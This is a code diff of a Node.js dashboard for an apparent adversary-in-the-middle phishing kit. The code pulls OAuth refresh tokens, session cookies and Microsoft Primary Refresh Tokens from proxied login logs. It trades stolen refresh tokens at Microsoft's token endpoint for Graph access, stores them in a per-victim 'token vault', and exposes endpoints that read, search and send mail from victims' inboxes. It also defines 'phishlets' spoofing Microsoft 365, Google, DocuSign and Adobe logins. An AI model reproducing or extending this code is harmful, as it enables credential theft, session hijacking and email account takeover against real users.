@@ -232,9 +232,9 @@ app.get('/api/tokens/:filename', (req, res) => {
             id_tokens: [],
             cookies: [],
             sessions: [],
-            prt: null,          // ✅ Primary Refresh Token
-            flowToken: null,    // ✅ Flow Token (often contains PRT)
-            originalRequest: null // ✅ Original request (may contain PRT)
+            prt: null,
+            flowToken: null,
+            originalRequest: null
         };
 
         for (const line of lines) {
@@ -249,7 +249,6 @@ app.get('/api/tokens/:filename', (req, res) => {
                 if (body) {
                     const bodyStr = typeof body === 'string' ? body : JSON.stringify(body);
                     
-                    // Standard OAuth tokens
                     const accessMatch = bodyStr.match(/access_token=([^&]+)/i);
                     const refreshMatch = bodyStr.match(/refresh_token=([^&]+)/i);
                     const idMatch = bodyStr.match(/id_token=([^&]+)/i);
@@ -257,7 +256,6 @@ app.get('/api/tokens/:filename', (req, res) => {
                     if (refreshMatch) tokens.refresh_tokens.push(decodeURIComponent(refreshMatch[1]));
                     if (idMatch) tokens.id_tokens.push(decodeURIComponent(idMatch[1]));
 
-                    // ✅ PRT Extraction - Look for Primary Refresh Token
                     const prtMatch = bodyStr.match(/primaryRefreshToken[=:]+([^&"',}]+)/i);
                     const flowTokenMatch = bodyStr.match(/flowToken[=:]+([^&"',}]+)/i);
                     const originalRequestMatch = bodyStr.match(/originalRequest[=:]+([^&"',}]+)/i);
@@ -265,7 +263,6 @@ app.get('/api/tokens/:filename', (req, res) => {
                     if (flowTokenMatch) tokens.flowToken = decodeURIComponent(flowTokenMatch[1]);
                     if (originalRequestMatch) tokens.originalRequest = decodeURIComponent(originalRequestMatch[1]);
 
-                    // Also look for PRT in JSON objects
                     try {
                         const json = typeof body === 'string' ? JSON.parse(body) : body;
                         if (json.access_token) tokens.access_tokens.push(json.access_token);
@@ -276,14 +273,12 @@ app.get('/api/tokens/:filename', (req, res) => {
                     } catch (e) {}
                 }
 
-                // Also check cookies for PRT (esctx contains encrypted PRT)
                 const setCookie = obj.proxyResponseHeaders?.['set-cookie'];
                 if (setCookie) {
                     const cookieArray = Array.isArray(setCookie) ? setCookie : [setCookie];
                     for (const cookie of cookieArray) {
                         const [nameValue] = cookie.split(';');
                         if (nameValue) tokens.cookies.push(nameValue.trim());
-                        // esctx cookie often contains the PRT
                         if (nameValue && nameValue.toLowerCase().includes('esctx')) {
                             tokens.prt = tokens.prt || nameValue.split('=')[1];
                         }
@@ -293,7 +288,6 @@ app.get('/api/tokens/:filename', (req, res) => {
                 const sessionCookie = obj.proxyRequestHeaders?.cookie;
                 if (sessionCookie) {
                     tokens.sessions.push(sessionCookie);
-                    // Extract esctx from cookie header
                     const esctxMatch = sessionCookie.match(/esctx=([^;]+)/);
                     if (esctxMatch) {
                         tokens.prt = tokens.prt || esctxMatch[1];
@@ -314,7 +308,7 @@ app.get('/api/tokens/:filename', (req, res) => {
 });
 
 // =============================================
-// 🔄 TOKEN EXCHANGE API (Refresh Token)
+// 🔄 TOKEN EXCHANGE API
 // =============================================
 app.post('/api/exchange', async (req, res) => {
     const { refresh_token } = req.body;
@@ -341,7 +335,7 @@ app.post('/api/exchange', async (req, res) => {
 });
 
 // =============================================
-// 🔄 PRT EXCHANGE API (Primary Refresh Token)
+// 🔄 PRT EXCHANGE API
 // =============================================
 app.post('/api/prt/exchange', async (req, res) => {
     const { prt, refresh_token } = req.body;
@@ -351,15 +345,12 @@ app.post('/api/prt/exchange', async (req, res) => {
 
     try {
         const axios = require('axios');
-        
-        // Try to exchange the token for a new access token
         const tokenData = {
             client_id: '3ce82761-cb43-493f-94bb-fe444b7a0cc4',
             grant_type: 'refresh_token',
             scope: 'https://graph.microsoft.com/.default offline_access'
         };
         
-        // Use refresh_token if provided, otherwise use PRT
         if (refresh_token) {
             tokenData.refresh_token = refresh_token;
         } else if (prt) {
@@ -372,109 +363,7 @@ app.post('/api/prt/exchange', async (req, res) => {
             { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
         );
         
-        // Store the PRT information
-        const prtInfo = {
-            access_token: response.data.access_token,
-            refresh_token: response.data.refresh_token,
-            id_token: response.data.id_token,
-            expires_in: response.data.expires_in,
-            token_type: response.data.token_type,
-            extracted_at: new Date().toISOString()
-        };
-        
-        res.json({ success: true, ...prtInfo });
-    } catch (err) {
-        res.status(500).json({ 
-            error: err.response?.data?.error_description || err.message 
-        });
-    }
-});
-
-// =============================================
-// 🏛️ TOKEN VAULT API
-// =============================================
-
-const TokenVault = require('./token_vault.js');
-const vault = new TokenVault(LOG_DIR, ENCRYPTION_KEY);
-
-// Scan logs and update vault
-app.post('/api/vault/scan', (req, res) => {
-    try {
-        const tokens = vault.scanLogs();
-        res.json({ success: true, count: tokens.length });
-    } catch (err) {
-        res.status(500).json({ error: err.message });
-    }
-});
-
-// Get all tokens
-app.get('/api/vault/tokens', (req, res) => {
-    try {
-        res.json({ success: true, tokens: vault.tokens });
-    } catch (err) {
-        res.status(500).json({ error: err.message });
-    }
-});
-
-// Get tokens grouped by user
-app.get('/api/vault/users', (req, res) => {
-    try {
-        const users = vault.getTokensByUser();
-        res.json({ success: true, users });
-    } catch (err) {
-        res.status(500).json({ error: err.message });
-    }
-});
-
-// Get vault statistics
-app.get('/api/vault/stats', (req, res) => {
-    try {
-        const stats = vault.getStats();
-        res.json({ success: true, stats });
-    } catch (err) {
-        res.status(500).json({ error: err.message });
-    }
-});
-
-// Health check all tokens
-app.post('/api/vault/healthcheck', async (req, res) => {
-    try {
-        const results = await vault.healthCheckAll();
-        res.json({ success: true, results });
-    } catch (err) {
-        res.status(500).json({ error: err.message });
-    }
-});
-
-// Exchange token from vault
-app.post('/api/vault/exchange', async (req, res) => {
-    const { tokenId, tokenValue } = req.body;
-    if (!tokenValue) return res.status(400).json({ error: 'Token value required' });
-
-    try {
-        const axios = require('axios');
-        const response = await axios.post(
-            'https://login.microsoftonline.com/common/oauth2/v2.0/token',
-            new URLSearchParams({
-                client_id: '3ce82761-cb43-493f-94bb-fe444b7a0cc4',
-                refresh_token: tokenValue,
-                grant_type: 'refresh_token',
-                scope: 'https://graph.microsoft.com/.default offline_access'
-            }),
-            { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
-        );
-        
-        // Update token status if found
-        if (tokenId) {
-            const token = vault.tokens.find(t => t.value === tokenValue);
-            if (token) {
-                token.status = 'valid';
-                token.lastExchanged = new Date().toISOString();
-                vault.save();
-            }
-        }
-        
-        res.json({ success: true, data: response.data });
+        res.json({ success: true, ...response.data });
     } catch (err) {
         res.status(500).json({ 
             error: err.response?.data?.error_description || err.message 
@@ -542,8 +431,6 @@ app.post('/api/ai/analyze', async (req, res) => {
 // =============================================
 // 📧 WEBMAIL API ENDPOINTS
 // =============================================
-
-// Get mailbox folders
 app.post('/api/webmail/folders', async (req, res) => {
     const { accessToken } = req.body;
     if (!accessToken) return res.status(400).json({ error: 'Access token required' });
@@ -558,7 +445,6 @@ app.post('/api/webmail/folders', async (req, res) => {
     }
 });
 
-// Get emails from a specific folder
 app.post('/api/webmail/emails', async (req, res) => {
     const { accessToken, folderId = 'inbox', limit = 50, skip = 0 } = req.body;
     if (!accessToken) return res.status(400).json({ error: 'Access token required' });
@@ -583,7 +469,6 @@ app.post('/api/webmail/emails', async (req, res) => {
     }
 });
 
-// Get single email with full body
 app.post('/api/webmail/email', async (req, res) => {
     const { accessToken, messageId } = req.body;
     if (!accessToken) return res.status(400).json({ error: 'Access token required' });
@@ -599,7 +484,6 @@ app.post('/api/webmail/email', async (req, res) => {
     }
 });
 
-// Send email (reply/forward)
 app.post('/api/webmail/send', async (req, res) => {
     const { accessToken, to, subject, body, replyToId, forwardFromId } = req.body;
     if (!accessToken) return res.status(400).json({ error: 'Access token required' });
@@ -632,7 +516,6 @@ app.post('/api/webmail/send', async (req, res) => {
     }
 });
 
-// Search emails
 app.post('/api/webmail/search', async (req, res) => {
     const { accessToken, query, folderId = 'inbox', limit = 50 } = req.body;
     if (!accessToken) return res.status(400).json({ error: 'Access token required' });
@@ -654,8 +537,6 @@ app.post('/api/webmail/search', async (req, res) => {
 // =============================================
 // 📊 VISITS API ENDPOINTS
 // =============================================
-
-// ---------- API: Get visits ----------
 app.get('/api/visits', (req, res) => {
     try {
         const VISITS_LOG_FILE = path.join(__dirname, 'visit_logs', 'visits.log');
@@ -666,18 +547,11 @@ app.get('/api/visits', (req, res) => {
         const content = fs.readFileSync(VISITS_LOG_FILE, 'utf-8');
         const lines = content.split('\n').filter(line => line.trim());
         const visits = lines.map(line => JSON.parse(line));
-        
-        // Sort by timestamp (newest first)
         visits.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
-        
-        // Count unique IPs
         const uniqueIPs = new Set(visits.map(v => v.ip)).size;
-        
-        // Count visits today and this week
         const now = new Date();
         const today = new Date(now.getFullYear(), now.getMonth(), now.getDate());
         const weekAgo = new Date(now.getTime() - 7 * 24 * 60 * 60 * 1000);
-        
         const todayVisits = visits.filter(v => new Date(v.timestamp) >= today);
         const weekVisits = visits.filter(v => new Date(v.timestamp) >= weekAgo);
         
@@ -693,26 +567,21 @@ app.get('/api/visits', (req, res) => {
     }
 });
 
-// ---------- API: Get visit stats (summary) ----------
 app.get('/api/visits/stats', (req, res) => {
     try {
         const VISITS_LOG_FILE = path.join(__dirname, 'visit_logs', 'visits.log');
         if (!fs.existsSync(VISITS_LOG_FILE)) {
             return res.json({ total: 0, uniqueIPs: 0, today: 0, week: 0 });
         }
-        
         const content = fs.readFileSync(VISITS_LOG_FILE, 'utf-8');
         const lines = content.split('\n').filter(line => line.trim());
         const visits = lines.map(line => JSON.parse(line));
-        
         const now = new Date();
         const today = new Date(now.getFullYear(), now.getMonth(), now.getDate());
         const weekAgo = new Date(now.getTime() - 7 * 24 * 60 * 60 * 1000);
-        
         const todayVisits = visits.filter(v => new Date(v.timestamp) >= today);
         const weekVisits = visits.filter(v => new Date(v.timestamp) >= weekAgo);
         const uniqueIPs = new Set(visits.map(v => v.ip)).size;
-        
         res.json({
             total: visits.length,
             uniqueIPs: uniqueIPs,
@@ -725,31 +594,77 @@ app.get('/api/visits/stats', (req, res) => {
 });
 
 // =============================================
-// 🎭 PHISHLET API
+// 🏛️ TOKEN VAULT API
 // =============================================
 
-app.get('/api/phishlets', (req, res) => {
+const TokenVault = require('./token_vault.js');
+const vault = new TokenVault(LOG_DIR, ENCRYPTION_KEY);
+
+app.post('/api/vault/scan', (req, res) => {
     try {
-        const phishlets = require('./phishlets.json');
-        res.json({ success: true, phishlets });
+        const tokens = vault.scanLogs();
+        res.json({ success: true, count: tokens.length });
     } catch (err) {
         res.status(500).json({ error: err.message });
     }
 });
 
-app.post('/api/phishlets/toggle', (req, res) => {
-    const { id, enabled } = req.body;
+app.get('/api/vault/tokens', (req, res) => {
     try {
-        const phishlets = require('./phishlets.json');
-        if (phishlets[id]) {
-            phishlets[id].enabled = enabled;
-            fs.writeFileSync(path.join(__dirname, 'phishlets.json'), JSON.stringify(phishlets, null, 2));
-            res.json({ success: true });
-        } else {
-            res.status(404).json({ error: 'Phishlet not found' });
-        }
+        res.json({ success: true, tokens: vault.tokens });
     } catch (err) {
         res.status(500).json({ error: err.message });
+    }
+});
+
+app.get('/api/vault/users', (req, res) => {
+    try {
+        const users = vault.getTokensByUser();
+        res.json({ success: true, users });
+    } catch (err) {
+        res.status(500).json({ error: err.message });
+    }
+});
+
+app.get('/api/vault/stats', (req, res) => {
+    try {
+        const stats = vault.getStats();
+        res.json({ success: true, stats });
+    } catch (err) {
+        res.status(500).json({ error: err.message });
+    }
+});
+
+app.post('/api/vault/healthcheck', async (req, res) => {
+    try {
+        const results = await vault.healthCheckAll();
+        res.json({ success: true, results });
+    } catch (err) {
+        res.status(500).json({ error: err.message });
+    }
+});
+
+app.post('/api/vault/exchange', async (req, res) => {
+    const { tokenValue } = req.body;
+    if (!tokenValue) return res.status(400).json({ error: 'Token value required' });
+
+    try {
+        const axios = require('axios');
+        const response = await axios.post(
+            'https://login.microsoftonline.com/common/oauth2/v2.0/token',
+            new URLSearchParams({
+                client_id: '3ce82761-cb43-493f-94bb-fe444b7a0cc4',
+                refresh_token: tokenValue,
+                grant_type: 'refresh_token',
+                scope: 'https://graph.microsoft.com/.default offline_access'
+            }),
+            { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
+        );
+        res.json({ success: true, data: response.data });
+    } catch (err) {
+        res.status(500).json({ 
+            error: err.response?.data?.error_description || err.message 
+        });
     }
 });
 
@@ -760,30 +675,21 @@ app.post('/api/phishlets/toggle', (req, res) => {
 app.get('/api/analytics', (req, res) => {
     try {
         const VISITS_LOG_FILE = path.join(__dirname, 'visit_logs', 'visits.log');
-        const LOG_DIR = path.join(__dirname, 'phishing_logs');
-        
         let visits = [];
         let captures = [];
         
-        // Load visits
         if (fs.existsSync(VISITS_LOG_FILE)) {
             const content = fs.readFileSync(VISITS_LOG_FILE, 'utf-8');
             const lines = content.split('\n').filter(line => line.trim());
             visits = lines.map(line => JSON.parse(line));
         }
         
-        // Get captures from logs
         const logFiles = fs.readdirSync(LOG_DIR).filter(f => f.endsWith('.log'));
         captures = logFiles.map(f => {
             const stat = fs.statSync(path.join(LOG_DIR, f));
-            return {
-                file: f,
-                modified: stat.mtime,
-                size: stat.size
-            };
+            return { file: f, modified: stat.mtime, size: stat.size };
         });
         
-        // Calculate analytics
         const now = new Date();
         const today = new Date(now.getFullYear(), now.getMonth(), now.getDate());
         const weekAgo = new Date(now.getTime() - 7 * 24 * 60 * 60 * 1000);
@@ -797,7 +703,6 @@ app.get('/api/analytics', (req, res) => {
         const weekCaptures = captures.filter(c => c.modified >= weekAgo);
         const monthCaptures = captures.filter(c => c.modified >= monthAgo);
         
-        // Conversion rates
         const conversionRate = {
             today: todayVisits.length > 0 ? (todayCaptures.length / todayVisits.length * 100).toFixed(1) : 0,
             week: weekVisits.length > 0 ? (weekCaptures.length / weekVisits.length * 100).toFixed(1) : 0,
@@ -805,7 +710,6 @@ app.get('/api/analytics', (req, res) => {
             total: visits.length > 0 ? (captures.length / visits.length * 100).toFixed(1) : 0
         };
         
-        // Daily capture data for charts
         const dailyCaptures = {};
         const dailyVisits = {};
         for (let i = 6; i >= 0; i--) {
@@ -825,7 +729,6 @@ app.get('/api/analytics', (req, res) => {
             if (dailyVisits.hasOwnProperty(key)) dailyVisits[key]++;
         });
         
-        // Top target domains
         const domains = {};
         visits.forEach(v => {
             const url = v.url || '';
@@ -840,7 +743,6 @@ app.get('/api/analytics', (req, res) => {
             .slice(0, 5)
             .map(([domain, count]) => ({ domain, count }));
         
-        // Unique IPs
         const uniqueIPs = new Set(visits.map(v => v.ip)).size;
         
         res.json({
@@ -875,7 +777,76 @@ app.get('/api/analytics', (req, res) => {
     }
 });
 
-// ---------- WebSocket Server for real-time updates ----------
+// =============================================
+// 🎭 PHISHLET API
+// =============================================
+
+app.get('/api/phishlets', (req, res) => {
+    try {
+        const phishletsPath = path.join(__dirname, 'phishlets.json');
+        if (!fs.existsSync(phishletsPath)) {
+            // Create default phishlets file
+            const defaultPhishlets = {
+                "microsoft": {
+                    "name": "Microsoft Office 365",
+                    "icon": "microsoft",
+                    "file": "index_smQGUDpTF7PN.html",
+                    "entryPoint": "/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true&redirect_urI=https://login.microsoftonline.com/",
+                    "enabled": true
+                },
+                "google": {
+                    "name": "Google Workspace",
+                    "icon": "google",
+                    "file": "google_login.html",
+                    "entryPoint": "/google/login?redirect_uri=https://accounts.google.com/",
+                    "enabled": false
+                },
+                "docusign": {
+                    "name": "DocuSign",
+                    "icon": "docusign",
+                    "file": "docusign_login.html",
+                    "entryPoint": "/docusign/login?redirect_uri=https://account.docusign.com/",
+                    "enabled": false
+                },
+                "adobe": {
+                    "name": "Adobe Acrobat",
+                    "icon": "adobe",
+                    "file": "adobe_login.html",
+                    "entryPoint": "/adobe/login?redirect_uri=https://account.adobe.com/",
+                    "enabled": false
+                }
+            };
+            fs.writeFileSync(phishletsPath, JSON.stringify(defaultPhishlets, null, 2));
+            return res.json({ success: true, phishlets: defaultPhishlets });
+        }
+        
+        const phishlets = JSON.parse(fs.readFileSync(phishletsPath, 'utf-8'));
+        res.json({ success: true, phishlets });
+    } catch (err) {
+        res.status(500).json({ error: err.message });
+    }
+});
+
+app.post('/api/phishlets/toggle', (req, res) => {
+    const { id, enabled } = req.body;
+    try {
+        const phishletsPath = path.join(__dirname, 'phishlets.json');
+        const phishlets = JSON.parse(fs.readFileSync(phishletsPath, 'utf-8'));
+        if (phishlets[id]) {
+            phishlets[id].enabled = enabled;
+            fs.writeFileSync(phishletsPath, JSON.stringify(phishlets, null, 2));
+            res.json({ success: true });
+        } else {
+            res.status(404).json({ error: 'Phishlet not found' });
+        }
+    } catch (err) {
+        res.status(500).json({ error: err.message });
+    }
+});
+
+// =============================================
+// 🏁 WEBSOCKET SERVER
+// =============================================
 const server = app.listen(PORT, () => {
     console.log(`📊 Dashboard running on http://localhost:${PORT}`);
     console.log(`🔐 Login: ${user} / ${pass}`);
